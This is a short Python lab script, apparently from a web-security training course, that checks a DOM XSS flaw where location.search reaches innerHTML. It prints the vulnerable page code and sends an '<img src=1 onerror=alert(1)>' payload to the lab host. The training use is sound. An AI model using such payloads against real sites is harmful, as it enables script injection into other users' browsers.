# Lab: DOM XSS in innerHTML sink using source location.search
 
import requests
 
 
base = "https://0afa003a04a685928066c11c00f00001.web-security-academy.net"
s = requests.Session()
PAYLOAD = "<img src=1 onerror=alert(1)>"   # innerHTML does not run <script> tags -> use an event handler
 
print("===========[step1] Check source/sink on the search page===============")
r = s.get(base, params={"search": "abc123"})
print(r.text)
'''
                    <section class=blog-header>
                        <h1><span>0 search results for '</span><span id="searchMessage"></span><span>'</span></h1>
                        <script>
                            function doSearchQuery(query) {
                                document.getElementById('searchMessage').innerHTML = query;
                            }
                            var query = (new URLSearchParams(window.location.search)).get('search');
                            if(query) {
                                doSearchQuery(query);
                            }
                        </script>
                        <hr>
                    </section>
'''
print("source(location.search):", "location.search" in r.text)
print("sink(innerHTML):", "innerHTML" in r.text)
 
print("===========[step2] Check if the payload is reflected in the server response===============")
r = s.get(base, params={"search": PAYLOAD})
print("status:", r.status_code)
print("payload in server response:", PAYLOAD in r.text)
# False is expected: the browser's JS inserts it via innerHTML, not the server = DOM XSS
# requests does not run JS, so this script cannot solve the lab. Solve it in the browser.
 